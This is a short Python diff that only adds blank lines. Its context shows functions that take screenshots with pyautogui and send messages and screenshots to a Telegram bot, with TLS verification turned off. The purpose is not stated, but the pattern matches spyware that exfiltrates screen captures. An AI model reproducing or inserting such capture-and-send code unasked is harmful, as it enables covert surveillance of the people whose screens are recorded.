@@ -87,6 +87,7 @@ def send_message_to_tg(bot_token, chat_id, message):
 
     r = requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={'chat_id': chat_id, 'text': message}, verify=False)
 
+
 def take_screenshot():
     screenshot = pyautogui.screenshot()
     scr_bytes = io.BytesIO()
@@ -94,6 +95,7 @@ def take_screenshot():
     scr_bytes.seek(0)
 
     return scr_bytes
+
 
 def send_screenshot_to_tg(bot_token, chat_id, screenshot_bytes):
     import requests
